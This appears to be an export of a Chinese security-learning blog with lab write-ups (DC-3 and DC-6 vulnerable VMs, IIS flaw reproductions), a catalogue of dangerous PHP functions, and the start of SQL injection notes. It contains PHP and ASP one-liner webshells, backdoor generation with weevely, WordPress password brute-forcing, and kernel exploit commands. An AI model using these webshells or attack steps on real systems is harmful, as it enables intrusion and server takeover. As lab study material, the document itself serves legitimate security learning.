<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p>
<p>用weevely生成php后门文件.</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p>
<p>复制代码新建webshell.php文件，粘贴代码，保存</p>
<p>然后用weevely连，成功拿到shell.</p>
<h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p>
<p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p>
<p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p>
<p>我们将exp下载下来然后经过一系列的解压后</p>
<pre><code>unzip 39772.zip 

cd 39772

tar -xvf exploit.tar  

cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
<p>​                ./doubleput</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p>
<p>但是不知道为什么一直没法成功。。。。。</p>
]]></content>
      <categories>
        <category>靶机学习</category>
      </categories>
      <tags>
        <tag>DC-3靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6靶机</title>
    <url>/2020/03/31/dc-6-ba-ji/</url>
    <content><![CDATA[<h2 id="DC-6靶机学习"><a href="#DC-6靶机学习" class="headerlink" title="DC-6靶机学习"></a>DC-6靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p>
<p>然后我们首先考虑获得靶机的IP地址。使用arp去发现内网存活主机，从而确定靶机IP为192.168.153.137。</p>
<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200455.png" alt=""></p>
<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用神器nmap对靶机IP进行探测。</p>
<pre><code>nmap -A -p 1-65535 192.168.153.137 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200850.png" alt=""></p>
<p>我们发现靶机开放了22端口和80端口。</p>
<p>我们直接访问IP发现被重定向到了<a href="http://wordy。" target="_blank" rel="noopener">http://wordy。</a></p>
<p>我们编辑 /etc/hosts中的文件添加该域名</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200211113951.png" alt=""></p>
<p>我们再次尝试访问192.168.153.137发现成功跳转，</p>
<p>我们利用火狐自带插件进行指纹识别</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200209201216.png" alt=""></p>
<p>我们可以确定该cms为WordPress，且数据库为MYSQL</p>
<h4 id="第三步、漏洞扫描"><a href="#第三步、漏洞扫描" class="headerlink" title="第三步、漏洞扫描"></a>第三步、漏洞扫描</h4><p>使用wordpress漏洞测试工具wpscan进行网站漏洞探测，wpscan是一款针对wordpress的黑盒漏洞扫描器，可以获得包括版本、主体、插件等信息。</p>
<pre><code>wpscan --url http://Wordy -u t</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209201612.png" alt=""></p>
<p>通过扫描我们得到几个系统的用户名信息。我们接下来思考能否获得任一账号的密码。</p>
<h4 id="第四步、漏洞利用"><a href="#第四步、漏洞利用" class="headerlink" title="第四步、漏洞利用"></a>第四步、漏洞利用</h4><p>我们首先根据作者的提示，使用到kali里面的rockyou.txt字典</p>
<p>使用解压命令：</p>
<pre><code>gzip -d rockyou.txt.gz</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209202612.png" alt=""></p>
<pre><code>cat rockyou.txt | grep k01&gt;k01.txt</code></pre><p>将里面的k01的部分导出到dc6目录下面的passwords.txt</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200209202622.png" alt=""></p>
<p>接着使用wpscan的暴力破解命令：</p>
<pre><code>wpscan --url wordy -u -p passwords.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209203905.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200209204033.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200209204455.png" alt=""></p>
]]></content>
      <categories>
        <category>靶机学习</category>
      </categories>
      <tags>
        <tag>DC-6靶机学习</tag>
      </tags>
  </entry>
  <entry>
    <title>IIS中间件漏洞</title>
    <url>/2020/04/03/iis-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
<p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p>
<p>安装windows server 2003版本，准备iis写入工具，下载IIS6.0版本</p>
<p>2.复现过程：</p>
<p>我们首先在虚拟机中打开win server 2003 版本。</p>
<img src="QQ截图20200118185950.png" style="zoom:50%;" />

<p>之后我们安装IIS6.0服务,进入网站配置界面</p>
<img src="QQ截图20200118190925.png" style="zoom:50%;" />

<p>打开webDAV服务配置  Active Server pages(允许解析asp文件)，提供文件写入权限。</p>
<img src="QQ截图20200118191122.png" style="zoom:33%;" />

<img src="QQ截图20200118191318.png" style="zoom: 50%;" />

<p>我们尝试在物理机打开网站</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200118191510.png" alt=""></p>
<p>说明服务已开启。</p>
<p>我们打开iis写入工具。尝试写入test.txt文件。</p>
<img src="QQ截图20200118192007.png" style="zoom:50%;" />



<p>发现提示“您未被授予查看该页”。</p>
<p>后来发现未开启来宾用户足够的权限</p>
<img src="QQ截图20200118192257.png" style="zoom:50%;" />

<p>我们再次尝试。成功写入。</p>
<img src="QQ截图20200118192408.png" style="zoom:50%;" />

<img src="QQ截图20200118192500.png" style="zoom:50%;" />

<p>我们新建一个asp一句话木马文件，先命名为shell.txt,写入网站根目录下。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200118193312.png" alt=""></p>
<p>然后使用iiswrite的mv功能。首先我们需开启网站主目录下的脚本资源访问功能</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200118112701.png" alt=""></p>
<p>然后将根目录下的shell.txt修改为shell.asp</p>
<img src="QQ截图20200118112855.png" style="zoom: 80%;" />

<p>之后我们使用菜刀连接即可。</p>
<h4 id="IIS-短文件名猜解漏洞"><a href="#IIS-短文件名猜解漏洞" class="headerlink" title="IIS-短文件名猜解漏洞"></a>IIS-短文件名猜解漏洞</h4><p><strong>什么是短文件名？</strong></p>
<p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成对应的window 8.3短文件名。</p>
<h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>  为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。<br> 在Windows下查看对应的短文件名，可以使用命令 <code>dir /x</code></p>
<p>​     攻击者使用通配符*和？发送一个请求到IIS，当IIS接收到一个文件路径中包含“~”请求时，返回的HTTP状态码和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400（报错页面）。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们进入win server 2003的网站根目录下。</p>
<img src="QQ截图20200118194442.png" style="zoom:67%;" />

<p>在根目录下新建多个超过8个字符的文件名</p>
<p>​                   <img src="QQ%E6%88%AA%E5%9B%BE20200118144312.png" alt=""></p>
<p>我们在命令提示符使用 dir c:/x，即可看到我们创建的文件的短文件名。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200118144400.png" alt=""></p>
<p>我们在物理机上访问该网站并使用通配符猜解文件名。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200202204523.png" alt=""></p>
<p>可以看到网页回显404，说明网站根目录存在所猜解的文件名。</p>
<img src="QQ截图20200202204745.png" style="zoom:67%;" />

<p>我们访问不存在的文件会报错。</p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>升级.net framework</li>
<li>修改注册表键值：</li>
</ol>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200202205239.png" alt=""></p>
<p>将数值数据改为1，1代表不创建短文件名格式。修改完成后，需要重启系统生效。</p>
<h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS-解析漏洞"></a>IIS-解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.</p>
<p>举例：/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关.</p>
<h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们在www下新建一个test.asp文件夹和test.jpg图像文件</p>
<p>在图像文件中写入任意字符。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210506.png" alt=""></p>
<p>我们直接访问图像文件，发现无法成功解析。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210532.png" alt=""></p>
<p>我们再将图片文件放入asp文件夹下重新尝试访问</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210636.png" alt=""></p>
<p>发现网站将该文件解析成了asp文件进而成功执行。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200202210706.png" alt=""></p>
<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul>
<li>取消网站后台新建目录的功能，不允许新建目录。</li>
<li>对新建目录文件名进行过滤，不允许新建包含.的文件夹。</li>
</ul>
<h4 id="IIS远程代码执行"><a href="#IIS远程代码执行" class="headerlink" title="IIS远程代码执行"></a>IIS远程代码执行</h4><h5 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​    在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
<h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>1.漏洞环境搭建：</p>
<p>在windows server 2003 r2 32位上安装iis6.0</p>
<p>2.触发漏洞：</p>
<p>在本地执行exp</p>
<p><img src="4-2-1.png" alt=""></p>
<p>执行成功后，服务器弹出计算器。</p>
<p><img src="4-2-2.png" alt=""></p>
<h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.关闭webDAV服务</p>
<p>2.使用相关防护设备</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><h5 id="https-www-secpulse-com-archives-82410-html"><a href="#https-www-secpulse-com-archives-82410-html" class="headerlink" title="https://www.secpulse.com/archives/82410.html"></a><a href="https://www.secpulse.com/archives/82410.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/82410.html</a></h5><p><a href="https://www.aqniu.com/learn/43996.html" target="_blank" rel="noopener">https://www.aqniu.com/learn/43996.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45744757/article/details/104512683" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45744757/article/details/104512683</a></p>
]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>IIS中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP危险函数总结</title>
    <url>/2020/04/02/php-wei-xian-han-shu-zong-jie/</url>
    <content><![CDATA[<h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p>
<pre><code>$_GET            
$POST
$_fILES
$_COOKIE
$_REQUEST        
$_SERVER        
$_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
<li>eval函数</li>
<li>assert函数</li>
<li>create_function 函数</li>
<li>preg_replace 函数</li>
<li>call_user_func/call_user_func_array函数</li>
<li>array_map函数</li>
<li>array_filter函数</li>
<li>usort/uasort函数</li>
<li>$a($b)动态函数</li>
</ul>
<h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
<p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
<pre><code>&lt;?php
$string = &quot;beautiful&quot;;
$time = &quot;winter&quot;;
$str = &#39;This is a $string $time morning!&#39;;
eval(&quot;\$str = \&quot;$str\&quot;;&quot;);
echo $str;

输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
<h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p>
<p>如果参数为字符串，它将会被assert()当做php代码来执行</p>
<p>版本只能为：5.x</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>如果我们提交?func=fo，即可写入shell.php</p>
<h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p>
<p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
<pre><code>&lt;?php

$id=$_GET[&#39;id&#39;];

$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;

$f1 = create_function(&#39;$a&#39;, $str2);

$f1(&quot;abc&quot;);
?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
<h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
<p>示例1：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>当我们所要匹配的字符串中含有test时</p>
<p>我们直接传入参数？a=phpinfo()即可执行代码。</p>
<p>示例2：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p>
<h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p>
<p>调用一个回调函数处理字符串,</p>
<p>call_user_func_array($callback,$param arr)</p>
<p>利用回调函数处理数组。</p>
<p><strong>示例1：</strong></p>
<img src=QQ截图20200218130741.png />

<img src="QQ截图20200218130753.png" style="zoom:67%;" />

<p><strong>示例2：</strong></p>
<p>一句话木马：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p>
<h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p>
<p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>

<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
 <img src="QQ截图20200218133234.png"  />



<h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p>
<p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p>
<p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<img src="QQ截图20200218202542.png" style="zoom:67%;" />

<h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p>
<p>使用用户自定义的比较函数对数组中的值进行排序 </p>
<p>usort(array, cmp_function)；</p>
<p>uasort(array, cmp_function)；</p>
<h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p>
<ul>
<li><p><strong>Fopen()</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
</li>
</ul>
<ul>
<li><strong>file_get_content()</strong></li>
</ul>
<ul>
<li><strong>curl</strong></li>
</ul>
<h4 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h4><h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>system():执行外部程序，并且返回输出</p>
<h5 id="shell-exec-没有回显的命令执行"><a href="#shell-exec-没有回显的命令执行" class="headerlink" title="shell_exec(没有回显的命令执行)"></a>shell_exec(没有回显的命令执行)</h5><p>shell_exec():通过shell环境，并且将完整的输出以字符串方式返回</p>
<h5 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h5><p>执行外部程序并且显示原始输出</p>
<h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><p>​    exec():执行一个外部程序 </p>
<h5 id="ob-start函数"><a href="#ob-start函数" class="headerlink" title="ob_start函数"></a>ob_start函数</h5><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p>
<ul>
<li><strong>Copy()</strong></li>
</ul>
<p>copy() 函数拷贝文件</p>
<p>语法：copy(source,destination)</p>
<pre><code>&lt;?php
echo copy(&quot;source.txt&quot;,&quot;target.txt&quot;);
?&gt;</code></pre><p>输出1。</p>
<ul>
<li><p><strong>File_get_contents()/File_put_contents</strong></p>
<ul>
<li><p>file_get_contents() 把整个文件读入一个字符串中。</p>
<p>语法：file_get_contents(path,include_path,context,start,max_length)</p>
<pre><code>&lt;?php
echo file_get_contents(&quot;test.txt&quot;);
?&gt;</code></pre></li>
<li><p>file_put_contents() 函数把一个字符串写入文件中。</p>
<p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p>
<pre><code>&lt;?php
echo file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);
?&gt;</code></pre></li>
</ul>
</li>
<li><p><strong>File()</strong></p>
<ul>
<li><p>file() 函数把整个文件读入一个数组中。</p>
<p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p>
<p>语法：file(path,include_path,context)</p>
<pre><code>&lt;?php
print_r(file(&quot;test.txt&quot;));
?&gt;</code></pre></li>
</ul>
</li>
<li><p><strong>Fopen()</strong></p>
<ul>
<li><p>open() 函数打开一个文件或 URL。</p>
<p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p>
<p>语法：fopen(filename,mode,include_path,context)</p>
<pre><code>&lt;?php
$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);
$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);
$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);
$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);
$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);
?&gt;</code></pre></li>
</ul>
</li>
<li><p><strong>Move_uploaded_file()</strong></p>
<ul>
<li><p>move_uploaded_file() 函数把上传的文件移动到新位置。</p>
<p>如果成功该函数返回 TRUE，如果失败则返回 FALSE。</p>
<p>语法：move_uploaded_file(file,newloc)</p>
</li>
</ul>
</li>
<li><p><strong>Readfile()</strong></p>
<ul>
<li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p>
<p>语法：readfile(filename,include_path,context)</p>
<pre><code>&lt;?php
echo readfile(&quot;test.txt&quot;);
?&gt;</code></pre></li>
</ul>
</li>
<li><p><strong>Rename()</strong></p>
<ul>
<li><p>rename() 函数重命名文件或目录。</p>
<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
<p>语法：rename(oldname,newname,context)</p>
<pre><code>&lt;?php
rename(&quot;images&quot;,&quot;pictures&quot;);
?&gt;</code></pre></li>
</ul>
</li>
<li><p><strong>Unlink()</strong></p>
<ul>
<li><p>unlink() 函数删除文件。</p>
<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
<p>语法：unlink(filename,context)</p>
<pre><code>&lt;?php
$file = &quot;test.txt&quot;;
if (!unlink($file))
{
echo (&quot;Error deleting $file&quot;);
}
else
{
echo (&quot;Deleted $file&quot;);
}
?&gt;</code></pre></li>
</ul>
</li>
</ul>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://wh0ale.github.io/2019/08/21/php代码审计危险函数总结/" target="_blank" rel="noopener">https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://blog.csdn.net/qq_43431158/article/details/99673451" target="_blank" rel="noopener">https://blog.csdn.net/qq_43431158/article/details/99673451</a></p>
<p><a href="https://blog.csdn.net/zhezhebie/article/details/80508139" target="_blank" rel="noopener">https://blog.csdn.net/zhezhebie/article/details/80508139</a></p>
]]></content>
      <categories>
        <category>代码审计学习</category>
      </categories>
      <tags>
        <tag>php危险函数</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入知识点总结+靶场笔记</title>
    <url>/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/</url>
    <content><![CDATA[<h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p>
<p>​     在schemata表中，schema_name字段用来存储数据库名。</p>
<p>​     在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
